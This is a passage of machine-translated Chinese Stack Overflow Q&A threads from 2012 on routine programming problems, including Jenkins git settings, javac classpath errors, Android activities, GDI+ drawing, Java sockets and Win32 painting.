好的，有两个地方需要更改连接字符串，一个来自 InitializeSimpleMembershipAttribute.cs，另一个在 AccountModels.cs 文件 public UsersContext() : base("DefaultConnection") { } 用您的连接字符串名称换出 DefaultConnection

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-16T06:00:54.520

您需要做两件事。一种是从 Azure 获取连接字符串。转到您的数据库的 Azure 仪表板。您应该会看到“显示连接字符串”链接。单击它并复制 ADO.NET 字符串。

您还需要启用从测试机器的 IP 地址访问数据库。仪表板上还有另一个链接，称为“管理允许的 IP 地址”。单击它并添加 IP 地址。

我刚刚将 Web.config 中的 DefaultConnection 字符串替换为我从 Azure 获得的字符串，并且它起作用了。只要我在门户中获得 IP 地址，它甚至可以在我的测试机器上运行。

# php - 在 WordPress 帖子中使用动态网站 URL？

> ID：13537659
> 
> 赞同：0
> 
> 时间：2012-11-24T02:12:04.057
> 
> 标签：php, wordpress

我正在制作一个 WordPress 博客，我必须经常更改站点 URL 以进行测试。有没有一种有效的方法将博客的当前主页 URL 动态插入到帖子中？

例如，我想做这样的事情：

```
[button link="[current_site_url]/about/" size="large"]About[/button] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:32:29.893

我想`<?php bloginfo('url'); ?>`这就是你要找的...

您也可以使用 url 获取模板目录

`<?php bloginfo('template_directory'); ?>`

要查看 bloginfo 的其他参数，请参考；

[http://codex.wordpress.org/Function_Reference/bloginfo](http://codex.wordpress.org/Function_Reference/bloginfo)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T06:08:36.133

Here are some examples:

```
//All these functions return the blog's URL as configured in Settings 
site_url(); // Does not display the URL
get_bloginfo('url'); // Does not display the URL
bloginfo('url'); // Always displays the URL

// Returns the root directory URL 
// For http://example.com/myblog returns http://example.com 
home_url(); // Does not display the URL 
```

# git - Jenkins - 未加载 git 全局配置

> ID：13537665
> 
> 赞同：5
> 
> 时间：2012-11-24T02:14:00.393
> 
> 标签：git, jenkins, ubuntu-12.04

我已经验证了我的 jenkins 用户正在通过构建任务访问 git 存储库，并为 jenkins user.name 和 user.email 设置了 git config，我已经确认使用：

```
su - jenkins
git config --global --get user.name
> Jenkins
git config --global --get user.email
> ci@domain.com 
```

但是，詹金斯构建无法创建标签并返回`"*** Please tell me who you are."`，我知道这是因为缺少 git 用户和电子邮件。关于我可以从哪里开始的任何想法？

正在 jenkins 用户的上下文中访问 git repo。我是否需要重新启动服务器或 git 或其他东西？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-24T02:19:21.353

在 Jenkins 网页上，转到**Manage Jenkins-> Configure System**，找到 git 设置。

您应该可以在那里填写“全局配置用户名值”和“全局配置用户名值”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-10-03T05:18:53.080

如果您需要为一项特定的 jenkins 作业设置 git 凭据，请在您的作业配置中的**Source Code Management**下从**Additional Behaviors**中选择**Custom User-name/email address**。在此处输入您的用户名和电子邮件。

# iphone - UITableviewCell 中的文本和图像渲染

> ID：13537666
> 
> 赞同：0
> 
> 时间：2012-11-24T02:14:09.297
> 
> 标签：iphone, uitableview

可能现在知道在单元格中渲染图像或文本还为时不晚。

我对此有点困惑。如果我们要在单元格中显示文本和图像。哪个先渲染。文本或图像？如果答案不是**异步**的。请给我适当的解释，以便它也有助于其他人如何在我的阶段。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T04:26:07.530

你为什么在乎？应该没关系。无论如何，它都不是实时渲染的。您调用绘图例程，然后在它脱离您的代码时将其绘制。股票，默认的 iOS 单元格带有一个图像和一些不同风格的文本行。如果您还有什么更令人兴奋的事情，那么使用自定义 UITableViewCell 类来形成您的单元格，生活会轻松很多。

# java - Javac“找不到符号”

> ID：13537668
> 
> 赞同：24
> 
> 时间：2012-11-24T02:14:33.750
> 
> 标签：java, compilation, command-line-interface, javac

我有这样的根目录：

```
├── classes
└── src
    └── vehicles
        ├── Bicycle.java
        └── BicycleMain.java 
```

自行车.java

```
package vehicles;

public class Bicycle {

  public int cadence;
  public int gear;
  public int speed;

  public Bicycle(int startCadence, int startSpeed, int startGear) {
    gear = startGear;
    cadence = startCadence;
    speed = startSpeed;
  }

  public void setCadence(int newValue) {
      cadence = newValue;
  }
  public void setGear(int newValue) {
    gear = newValue;
  }
  public void setSpeed(int newValue) {
    speed = newValue;
  }
  public int getGear() {
    return gear;
  }
  public int getCadence() {
    return cadence;
  }
  public int getSpeed() {
    return speed;
  }
  public void applyBrake(int decrement) {
    speed -= decrement;
  }
  public void speedUp(int increment) {
    speed += increment;
  } 
```

BicycleMain.java

```
package vehicles; import vehicles.*;

public class BicycleMain {
        public static void main (String args[]){
        Bicycle Bike = new Bicycle(10, 20, 1);
        System.out.println("We have a new bicycle with speed = " +Bike.getSpeed()+", cadence = "+Bike.getCadence()+", gear = "+Bike.getGear());
        } } 
```

我编译了 Bicycle.java 并成功，但没有 BicycleMain.java ：

```
symbol  : class Bicycle
location: class vehicles.BicycleMain
    Bicycle Bike = new Bicycle(10, 20, 1);
    ^
src/vehicles/BicycleMain.java:6: cannot find symbol
symbol  : class Bicycle
location: class vehicles.BicycleMain
    Bicycle Bike = new Bicycle(10, 20, 1);
                       ^
2 errors 
```

我尝试使用 Netbeans 运行这些文件，并且它可以正常工作！但是为什么当我在 CLI 中编译时它不起作用？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-11-24T10:12:22.220

首先，要使用编译 java 源文件，`javac`您需要明确指定要编译的文件。

例子：

```
javac PathToSourceFile/FileName.java 
```

`path`如果源文件在当前工作目录中，则无需提供。

其次，每当遇到 java 时`import abc.xyz.ClassName;`，它都会尝试`abc/xyz/ClassName`针对`classpath`当前工作目录进行解析。

因此，如果您在车辆文件夹中并编译您的代码，它不会编译，因为它会在文件夹车辆（不存在！）中查找文件夹车辆。

但是，您可以在车辆文件夹中执行此操作

```
javac -cp ../ BicycleMain.java 
```

它应该可以编译，因为类路径将设置为`../`包含车辆的目录（）。这将解决您的`Bicycle`课程。

然后使用

`java -cp ../ vehicles/BicycleMain`跑步。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-24T02:33:40.783

`import vehicles.*;`尝试从中删除该行，`BicycleMain.java`然后在命令行中使用 javac 进行编译。

顺便说一句，这是因为当您在 javac 中编译时，您在文件夹中`vehicles`并且您编写了一条语句`import vehicles.*;`，这意味着编译器在该文件夹中`BicycleMain.java`还有另一个文件夹，这里不是这种情况`vehicles``vehicles`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-09-07T06:34:45.663

我已经解决了这个问题，从“src”编译。

像这样的东西：`javac ./my_folder/my_file.java`

亲切的问候

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-25T19:02:55.733

我在这里尝试了所有解决方案，但最终我发现问题在于我使用了不同版本的 JDK 和 JRE。

检查 JRE 版本：

```
java -version 
```

检查JDK版本：

```
javac -version 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2016-06-30T17:45:56.460

只需从一开始就删除包装线，它就会 100% 工作。

通过终端转到存储文件的文件夹并键入**javac *.java**

也不需要导入类。

# android - 在另一个活动中查找地址

> ID：13537674
> 
> 赞同：-1
> 
> 时间：2012-11-24T02:16:59.507
> 
> 标签：android, eclipse, google-maps, android-activity, geocoding

我正在做一个谷歌地图应用程序。
我写了一个函数来查找地址。
当我在主要活动中编写代码时，它是工作。
但是当我在另一个活动中写作时。它总是强制关闭应用程序。

出了什么问题，我该如何解决？

这是我的日志：

```
11-24 08:56:52.659: E/AndroidRuntime(16334): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.zzzzzz/com.example.zzzzzz.Direction}: java.lang.NullPointerException 
```

这是我的主要活动代码查找地址：

```
 // find address
    final Geocoder geocoder = new Geocoder(MainActivity.this);

    final EditText ed = (EditText) findViewById(R.id.edAddress);
    Button btAddress = (Button) findViewById(R.id.btAddress);
    btAddress.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {

            String Ten = ed.getText().toString();
            try {
                List<Address> l = geocoder.getFromLocationName(Ten, 5);
                if (l != null && l.size() > 0) {
                    int lat = (int) (l.get(0).getLatitude() * 1000000);
                    int lon = (int) (l.get(0).getLongitude() * 1000000);
                    GeoPoint pt = new GeoPoint(lat, lon);

                    p = pt;
                    MapOverlay mar = new MapOverlay();
                    listOfOverlays.add(mar);

                    mv.getController().setZoom(17);
                    mv.getController().setCenter(pt);

                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                Log.v("Loi: ", "Loi 1 cua tui ne");
            }
        }
    }); 
```

这是我的功能开始其他活动：

```
public boolean onOptionsItemSelected(MenuItem item) {
    switch(item.getItemId()) {
    case R.id.about:
        //about
        Intent about = new Intent("com.example.zzzzzz.About");
        startActivity(about);
        break;
    case R.id.setting:
        //setting
        Intent setting = new Intent("com.example.zzzzzz.Setting");
        startActivity(setting);
        break;
    case R.id.direction:
        //direction
        Intent direction = new Intent("com.example.zzzzzz.Direction");
        startActivity(direction);
        break;
    case R.id.MyLocation:
        //mylocation
        //Intent mylocation = new Intent("com.example.zzzzzz.MyLocation");
        //startActivity(mylocation);
        initLocationManagerV2();
        LocationManager locationManager;
        locationManager = (LocationManager)getSystemService (Context.LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation (LocationManager.GPS_PROVIDER);
        double lat = location.getLatitude();
        double lng = location.getLongitude();
        GeoPoint find = new GeoPoint((int)(lat*1E6), (int)(lng*1E6));
        mv.getController().animateTo(find);
        mv.invalidate();
        break;
    }

    return false;
} 
```

这是我的指导活动：

```
public class Direction extends Activity {

MainActivity maintest;

@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.direction);

    // find address
    final Geocoder geocoder = new Geocoder(maintest);

    final EditText edMylocation = (EditText) findViewById(R.id.edMylocation);
    final EditText edEndpoint = (EditText) findViewById(R.id.edEndpoint);
    Button btDirection = (Button) findViewById(R.id.btDirection);

    btDirection.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {
            String endpoint = edEndpoint.getText().toString();

            try {
                List<Address> l = geocoder.getFromLocationName(endpoint, 5);
                if (l != null && l.size() > 0) {
                    int lat = (int) (l.get(0).getLatitude() * 1000000);
                    int lon = (int) (l.get(0).getLongitude() * 1000000);
                    GeoPoint pt = new GeoPoint(lat, lon);

                    //p = pt;
                    //MapOverlay mar = new MapOverlay();
                    //listOfOverlays.add(mar);

                    maintest.mv.getController().setZoom(17);
                    //maintest.mv.getController().setCenter(pt);

                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                Log.v("Loi: ", "Loi 1 cua tui ne");
            }

        }
    });

} 
```

}

////////////////////////////////这是我做的功能（AndylandDev）：

```
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (requestCode == 1 && resultCode == RESULT_OK) {

        String endpoint = data.getStringExtra("endpoint");
        final Geocoder geocoder = new Geocoder(MainActivity.this);
        try {
            List<Address> l = geocoder.getFromLocationName(endpoint, 5);
            if (l != null && l.size() > 0) {
                int lat = (int) (l.get(0).getLatitude() * 1000000);
                int lon = (int) (l.get(0).getLongitude() * 1000000);
                GeoPoint pt = new GeoPoint(lat, lon);

                p = pt;
                //MapOverlay mar = new MapOverlay();
                //listOfOverlays.add(mar);

                mv.getController().setZoom(17);
                mv.getController().setCenter(pt);

            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            Log.v("Loi: ", "Loi 1 cua tui ne");
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T04:26:11.217

所以

```
new Geocoder(maintest); 
```

可能会抛出 NullPointerException 因为您的 maintest 变量为空。一般来说，活动不应该像这样直接访问彼此。这将是正确的方法：

当您开始方向活动时：

```
case R.id.direction:
    //direction
    Intent direction = new Intent("com.example.zzzzzz.Direction");
    startActivityForResult(direction, 1);
    break; 
```

在Direction Activity的onCreate()中

```
...

btDirection.setOnClickListener(new OnClickListener() {

    public void onClick(View v) {
        Intent intent = new Intent();
        intent.putExtra("endpoint", edEndpoint.getText().toString());
        setResult(RESULT_OK, intent);
        finish();
});

... 
```

然后将此方法添加到 MainActivity

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {

if (requestCode == 1 && resultCode == RESULT_OK) {

    String endpoint = data.getStringExtra("endpoint");
    //do whatever with it
} 
```

# model-view-controller - Ruby on Rails 3 - 获取视图调用助手的名称

> ID：13537676
> 
> 赞同：0
> 
> 时间：2012-11-24T02:17:29.390
> 
> 标签：model-view-controller, variables, view, ruby-on-rails-3.1, helper

我正在尝试创建自己的助手，它将基于视图呈现特定内容。例如，一个名为“大”的视图，我希望我的助手使用类似`<%= smart_image "image" %>`will render的东西来渲染一个大图像`<img src="image_large.jpg" />`

我需要一种将视图名称传递给助手的方法。由于这个 Rails 项目的复杂性，我在上面过度简化了我的要求。我不想要像“通过参数传递视图名称”这样的解决方案，因为这在我的项目中不起作用，我需要它是自动的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T06:29:52.850

使用**action_name**获取操作的名称（和视图的名称）。

# c# - 给定一个矩形，在 GDI+ 中绘制一个三角形

> ID：13537679
> 
> 赞同：4
> 
> 时间：2012-11-24T02:18:05.893
> 
> 标签：c#, winforms, gdi+

我正在尝试创建一个函数，该函数将在给定`Rectangle`结构的情况下创建一个三角形。我有以下代码：

```
public enum Direction {
    Up,
    Right,
    Down,
    Left
}

private void DrawTriangle(Graphics g, Rectangle r, Direction direction)
{
    if (direction == Direction.Up) {
        int half = r.Width / 2;

        g.DrawLine(Pens.Black, r.X, r.Y + r.Height, r.X + Width, r.Y + r.Height); // base
        g.DrawLine(Pens.Black, r.X, r.Y + r.Height, r.X + half, r.Y); // left side
        g.DrawLine(Pens.Black, r.X + r.Width, r.Y + r.Height, r.X + half, r.Y); // right side
    }
} 
```

这有效，只要方向向上。但我有两个问题。首先，有没有办法总是把它画出来，只是分别将它旋转 0、90、180 或 270 度，以避免使用四个`if`语句？其次，如何用黑色填充三角形？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:40:25.803

您可以绘制一个统一的三角形，然后使用矩阵变换对其进行旋转和缩放以适应矩形，但老实说，我认为这不仅仅是定义每个点需要做更多的工作。

```
 private void DrawTriangle(Graphics g, Rectangle rect, Direction direction)
    {            
        int halfWidth = rect.Width / 2;
        int halfHeight = rect.Height / 2;
        Point p0 = Point.Empty;
        Point p1 = Point.Empty;
        Point p2 = Point.Empty;          

        switch (direction)
        {
            case Direction.Up:
                p0 = new Point(rect.Left + halfWidth, rect.Top);
                p1 = new Point(rect.Left, rect.Bottom);
                p2 = new Point(rect.Right, rect.Bottom);
                break;
            case Direction.Down:
                p0 = new Point(rect.Left + halfWidth, rect.Bottom);
                p1 = new Point(rect.Left, rect.Top);
                p2 = new Point(rect.Right, rect.Top);
                break;
            case Direction.Left:
                p0 = new Point(rect.Left, rect.Top + halfHeight);
                p1 = new Point(rect.Right, rect.Top);
                p2 = new Point(rect.Right, rect.Bottom);
                break;
            case Direction.Right:
                p0 = new Point(rect.Right, rect.Top + halfHeight);
                p1 = new Point(rect.Left, rect.Bottom);
                p2 = new Point(rect.Left, rect.Top);
                break;
        }

        g.FillPolygon(Brushes.Black, new Point[] { p0, p1, p2 });  
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T06:54:40.357

[Graphics.Transform](http://msdn.microsoft.com/en-us/library/system.drawing.graphics.transform.aspx)和[Matrix.Rotate](http://msdn.microsoft.com/en-us/library/s0s56wcf%28v=vs.100%29.aspx)解决旋转部分。[Graphics.FillPolygon](http://msdn.microsoft.com/en-us/library/system.drawing.graphics.fillpolygon.aspx)用于填充三角形。

从示例到以下相应方法的近似未编译代码：

```
// Create a matrix and rotate it 45 degrees.
Matrix myMatrix = new Matrix();
myMatrix.Rotate(45, MatrixOrder.Append);
graphics.Transform = myMatrix;
graphics.FillPolygon(new SolidBrush(Color.Blue), points); 
```

# php - 在 SugarCRM 中以编程方式为用户分配多个角色

> ID：13537680
> 
> 赞同：1
> 
> 时间：2012-11-24T02:18:21.883
> 
> 标签：php, crm, sugarcrm

我试图找出如何以编程方式将多个角色分配给 SugarCRM 中的用户。通过做一些研究，我发现我可以利用 role->set_user_relationship() 函数部分地做到这一点。但它不允许我将多个角色作为参数传递。

理想情况下，我期待一种允许我传递角色 ID 数组的行为。执行此方法后，它应该将所有现有分配给用户的角色替换为新角色。但似乎这种行为不受开箱即用的支持，因此这个方向的任何指导/变化都是完全可以的。

我查看了各种 api 资源，但找不到任何有用的东西。谁能给我建议？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-05-18T10:28:35.133

这就是我用来向用户添加特定角色的方法。

```
 $role = new ACLRole();
    $role->retrieve($sugar_config['role']['boss']);

    if (!$current_user->check_role_membership($role->name)) {
        // Add user to role, if he/she is not already a member
        $role->set_relationship(
            'acl_roles_users',
            array(
                'role_id' => $role->id,
                'user_id' => $current_user->id
            ),
            false
        );
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T02:26:32.070

我既没有使用也没有查看此 CRM 的代码，但是如果您想在 CRM 中将角色 1 和角色 2 设置为新用户，您应该将新角色定义为 role3 ，因为角色使用逻辑是这样的。而且我猜在编码方面会有很多部分需要更改以对新用户使用多个角色，所以我的建议是为每个请求的授权级别定义尽可能多的角色。

# facebook - Facebook Like 按钮未在 Firefox 中显示

> ID：13537681
> 
> 赞同：2
> 
> 时间：2012-11-24T02:18:26.113
> 
> 标签：facebook, firefox, social-networking

我想弄清楚为什么我的 Facebook 喜欢按钮没有显示在我的 Firefox 网站上的有限（数量？）页面上。在网站的其他部分，我已经获得了类似 FB 的按钮来显示，但在这个特定的例子中，我没有。有任何想法吗？

[http://www.jdsupra.com/post/documentViewerEmbed.aspx?fid=dcba78a0-9b30-448d-97be-bb572b64ebe4&height=500&width=748&contentOnly=1](http://www.jdsupra.com/post/documentViewerEmbed.aspx?fid=dcba78a0-9b30-448d-97be-bb572b64ebe4&height=500&width=748&contentOnly=1)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T02:33:35.887

嵌套在该 FB 共享元素中较深的一些元素的宽度和高度为 0，因此如果您使用 Firebug 进行检查，即使它们显示在 DOM 中也是不可见的。我通过 CSS 为第一个 span 元素和 iframe 元素提供宽度和高度来解决这个问题。

```
.fb_iframe_widget iframe {
    height: 100px;
    position: absolute;
    width: 100px;
}

.fb_iframe_widget span {
    display: inline-block;
    position: relative;
    text-align: justify;
    vertical-align: text-bottom;
    width: 100px;
    height: 100px;
} 
```

这些是元素，但您必须将宽度和高度更改为您想要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T10:11:06.340

我猜你使用了like按钮生成器？

> [https://developers.facebook.com/docs/reference/plugins/like/](https://developers.facebook.com/docs/reference/plugins/like/)

此外，请始终在调试器中检查您想要喜欢的链接：

> [https://developers.facebook.com/tools/debug/](https://developers.facebook.com/tools/debug/)

顺便说一句，对我来说看起来不错，即使在 Firefox 中，该按钮也是可见的并且可以正常工作。但仅在此链接上：http: [//www.jdsupra.com/legalnews/group-claims-that-milwaukee-police-misco-28882/](http://www.jdsupra.com/legalnews/group-claims-that-milwaukee-police-misco-28882/)

您的原始链接缺少整个社交按钮栏，因为它被“显示：无”隐藏。

...但它仍然无法正确加载like按钮，我猜你遇到了这个问题：[Facebook Like buttons not display when loading hidden](https://stackoverflow.com/questions/12291017/facebook-like-buttons-not-displaying-when-loaded-hidden)

# javascript - Web 应用程序加载屏幕

> ID：13537683
> 
> 赞同：1
> 
> 时间：2012-11-24T02:18:51.027
> 
> 标签：javascript, jquery, html, css, web-applications

我有一个有几个树视图的网络应用程序。当页面加载时，我看到了无序列表，经过一小段延迟后，树的样式被渲染到 DOM 中。

有没有办法屏蔽 web 应用程序，并在屏幕中间有一个微调器，当页面上的所有内容完全呈现时，微调器消失并且掩码淡出？有点像您会在灯箱弹出对话框中看到的半透明蒙版。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:30:27.890

如果它是半透明的，您仍然会看到问题。添加

```
<div id="loadingmask"></div> 
```

之前`</body>`。如果您设置了其他 z-index，则可能需要调整其 z-index。

CSS：

```
#loadingmask
{
    width:100%;
    height:100%;
    position:absolute;
    top:0;
    background:#000 url(yourspinner.gif) center no-repeat;

} 
```

jQ // 当其他所有事情都完成时

```
$('#loadingmask').fadeOut(500, function(){ $(this).remove(); }); 
```

​</p>

# java - 将图片从电脑发送到安卓

> ID：13537685
> 
> 赞同：0
> 
> 时间：2012-11-24T02:19:10.187
> 
> 标签：java, c#, android, image

我正在尝试编写一个在 PC 上创建图像并通过 WiFi 传输并将其显示在 Android 上的应用程序。除了最后一部分，我一切正常。Android 和 PC 来回发送消息。PC 创建图像，将其转换为字节数组，将其发送到 Android，Android 接收它。不起作用的是将字节数组转换回图像。这是我的代码。

我 PC 上的 C# 代码使用它来创建字节数组

```
public byte[] imageToByteArray(System.Drawing.Image imageIn)
{
    MemoryStream ms = new MemoryStream();
    imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp );
    return ms.ToArray();
} 
```

我的 Android 上的 Java 代码使用此代码将字节数组转换回图像。

```
try {
    //This line always returns NULL
    Bitmap bmp=BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
    if (bmp != null) {
        //display image in UI
        imgViewer.setImageBitmap(bmp);
        imgViewer.invalidate();
    }
    else
    {
        Log.i(Consts.TAG, "image is null ");
    }                   
} catch (Exception e){
    Log.i(Consts.TAG, "ERROR decoding image " + e.toString());
} 
```

`BitmapFactory.decodeByteArray()`总是返回 NULL。我是否在 PC 上正确创建了字节数组？我应该在 Android 上以不同的方式重新创建图像吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T17:53:34.737

我想到了。我需要像这样转换图像。现在它起作用了。

```
 public static byte[] ImageToByte(Image img)
    {
        ImageConverter converter = new ImageConverter();
        return (byte[])converter.ConvertTo(img, typeof(byte[]));
    } 
```

感谢 zapl 和 FoamyGuy 的投入。

# ruby-on-rails-3 - 跨多个页面填写一个对象

> ID：13537690
> 
> 赞同：0
> 
> 时间：2012-11-24T02:19:28.453
> 
> 标签：ruby-on-rails-3

我有一个用户对象，它有大约 50 个字段。我不希望一个表单上的所有 50 个字段。我想要几个页面跨越表单。如果我只知道如何使用 users/new.html.erb 来填写表格，我会怎么做。第二页、第三页等我会用什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T05:16:31.303

您始终可以使用 Ajax（step1、step2、...、stepN）创建分部并加载每个分部，或者您可以搜索并使用 gem。

检查这个railscasts：

[http://railscasts.com/episodes/346-wizard-forms-with-wicked](http://railscasts.com/episodes/346-wizard-forms-with-wicked)

[http://railscasts.com/episodes/217-multistep-forms](http://railscasts.com/episodes/217-multistep-forms)

# java - 为什么我的套接字 getInputStream 返回 null？

> ID：13537691
> 
> 赞同：3
> 
> 时间：2012-11-24T02:19:52.117
> 
> 标签：java, sockets

好吧，我正在尝试创建一个连接到游戏登录数据库并连接到聊天服务器的应用程序，但是每当我尝试使用 Socket.getInputStream() 函数时，它都会抛出异常并且没有给我任何东西......我不确定它为什么会这样，所以我想知道你们中的任何人是否可以提供帮助..

我这样连接：

```
public boolean Connect( String RemoteHostIP, int RemotePort )
{
    try
    {
        if( m_Socket != null )
        {
            m_Socket.close( );
            m_Socket        = null;
        }

        m_Socket            = new Socket( );
        m_Host              = RemoteHostIP;
        m_Port              = RemotePort;

        m_Socket.connect( new InetSocketAddress( m_Host, m_Port ) );

        System.out.println( "   ~ Connected to: " + m_Socket.getInetAddress( ).getHostAddress( ) + ":" + m_Socket.getPort( ) );
    }
    catch( SocketException Ex )
    {
        m_Socket            = null;
        System.err.println( "[SocketHelper::Connect SEN] " + Ex.getLocalizedMessage( ) );
        return false;
    }
    catch( IOException Ex )
    {
        m_Socket            = null;
        System.err.println( "[SocketHelper::Connect IOE] " + Ex.getLocalizedMessage( ) );
        return false;
    }

    return true;
} 
```

然后像这样绑定到我的输入和输出：

```
public boolean Bind( )
{
    try
    {
        if( !m_Socket.isConnected( ) || m_Socket.isClosed( ) || !m_Socket.isBound( ) )
            return false;

        if( m_Socket.getOutputStream( ) != null )
        {
            m_Output            = new ObjectOutputStream( m_Socket.getOutputStream( ) );
            m_Output.flush( );
        }
        if( m_Socket.getInputStream( ) != null )
        {
            m_Input             = new ObjectInputStream( m_Socket.getInputStream( ) );
        }
    }
    catch( SocketException Ex )
    {
        System.err.println( "[SocketHelper::Bind SEN] " + Ex.getLocalizedMessage( ) + " (" + m_Output + " | " + m_Input + ")" );
        return false;
    }
    catch( IOException Ex )
    {
        System.err.println( "[SocketHelper::Bind IOE] " + Ex.getLocalizedMessage( ) + " (" + m_Output + " | " + m_Input + ")" );
        return false;
    }

    return true;
} 
```

这是我的输出

```
 ~ Connected to: 96.127.149.202:11031
Failed to Connect: Could not bind to socket
[SocketHelper::Bind IOE] null (java.io.ObjectOutputStream@1202f4d | null) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T18:48:17.453

这些方法都不会在任何时候返回 null ，并且这里没有任何证据表明其他情况。这里唯一为 null 的是异常的本地化消息和 m_input，因为您自己将其设置为 null，或者因为它最初为 null 并且根本没有设置。尝试以简单的方式执行此操作并打印堆栈跟踪。当你这样做时，你会发现异常是由 new ObjectInputStream() 抛出的。所有这一切都是显而易见的，但它被你对异常的糟糕处理所掩盖。

当您使用它时，请重命名您的方法。Bind 在套接字编程中已经有了意义，这不是。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-24T04:08:29.913

我之前已经处理过这个问题，并且 ObjectInputStreams 有时无法正常运行。在我的情况下，我发现服务器连接需要首先创建一个 ObjectOutputStream 否则它将像它一样返回 null 。服务器代码是您自己的，如果是，请确保在尝试在客户端创建 ObjectInputStream 之前先创建 ObjectOutputStream。

这是一个链接，可以帮助描述我不久前遇到的问题，该问题与您的问题类似。它与正在创建的流的顺序或顺序有关。

[对象输出流编程](http://www.jguru.com/faq/view.jsp?EID=333392)

# c++ - 重建后Win32 Paint Text仍然存在

> ID：13537695
> 
> 赞同：1
> 
> 时间：2012-11-24T02:21:22.263
> 
> 标签：c++, visual-studio-2010, winapi

在为我的 windows 类完成包装后，我用一些文本进行了测试，以确保一切正常。但是，无论我删除或注释掉文本“这是一个测试！！！！”，在运行程序时，它在可执行文件运行期间仍然存在。

```
LRESULT CALLBACK WinMsgHandler(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
        switch (uMsg)
        {
        case WM_PAINT:
            PAINTSTRUCT ps;
            HDC hdc;

            //hdc = BeginPaint(hwnd, &ps); 

            //TextOut(hdc, 0, 0, L"This is a TEST!!!", 17);

            //EndPaint(hwnd, &ps);
            break;
        case WM_DESTROY:
            bWindowClosed = TRUE;
            break;
        case WM_CREATE:
            MessageBox(NULL, L"Create", L"test", MB_OK);
            break;
        default:
            return CBaseWindow::WinMsgHandler(hwnd, uMsg, wParam, lParam);
        }

        return 0;
    }; 
```

编辑：

这是winmain源文件。我觉得这与我将所有内容括起来的方式有关。CDerivedWindow 是一个封装类，用于封装大部分窗口初始化过程。

```
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{

    CDerivedWindow mainWnd(hInstance);

    WNDCLASSEX wcx; 

    // Fill in the window class structure with default parameters 
    wcx.cbSize = sizeof(WNDCLASSEX);                            // size of structure 
    wcx.style = CS_HREDRAW | CS_VREDRAW;                        // redraw if size changes 
    wcx.lpfnWndProc = CBaseWindow::stWinMsgHandler;             // points to window procedure 
    wcx.cbClsExtra = 0;                                         // no extra class memory 
    wcx.cbWndExtra = 0;                                         // no extra window memory 
    wcx.hInstance = hInstance;                                  // handle to instance 
    wcx.hIcon = LoadIcon(NULL, IDI_APPLICATION);                // predefined app. icon 
    wcx.hCursor = LoadCursor(NULL, IDC_ARROW);                  // predefined arrow 
    wcx.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);    // white background brush 
    wcx.lpszMenuName = NULL;                                    // name of menu resource 
    wcx.lpszClassName = L"True Wild";                           // name of window class 
    wcx.hIconSm = LoadIcon(NULL, IDI_APPLICATION);              // small class icon 

    initSprites();

    // register the window
    if (mainWnd.RegisterWindow(&wcx))
    {
        DWORD dwError = 0;
        DWORD dwStyle = WS_OVERLAPPEDWINDOW | WS_VISIBLE;
        RECT rc;

        rc.top = 100;
        rc.left = 100;
        rc.right = SCREEN_WIDTH;
        rc.bottom = SCREEN_HEIGHT;

        // create the window and start the message loop
        // we will get kicked out of the message loop when the window closes
        if (mainWnd.Create(dwStyle, &rc))
        {
            // message loop
            MSG msg;

            //game Loop
            while (TRUE)
            {
                while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
                { 
                    // Translate the message and dispatch it to WindowProc()
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);

                    if (mainWnd.IsWindowClosed())
                        return 0;

                }

                //Run game code
                render();
            }
            return 0;
        }
        else
            return -1;
    }
    else
        return -2;

    return 0;
} 
```

编辑答案1：

```
// the message handler for this window
LRESULT CALLBACK WinMsgHandler(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_DESTROY:
        bWindowClosed = TRUE;
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:55:56.913

